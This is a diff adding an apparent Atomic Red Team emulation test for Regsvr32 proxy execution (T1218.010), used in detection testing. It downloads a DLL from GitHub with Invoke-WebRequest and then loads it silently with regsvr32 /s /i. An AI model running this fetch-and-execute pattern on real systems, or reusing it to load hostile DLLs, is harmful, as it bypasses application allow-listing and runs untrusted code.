@@ -1,0 +1,11 @@
+#TechniqueName: Signed Binary Proxy Execution: Regsvr32
+#AtomicTestName: Regsvr32 Silent DLL Install Call DllRegisterServer
+#Description: Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.
+#Language: cmd
+
+#get_prereq_commands
+New-Item -Type Directory (split-path PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll) -ErrorAction ignore | Out-Null
+Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll"
+
+#commands
+C:\Windows\system32\regsvr32.exe /s /i PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll
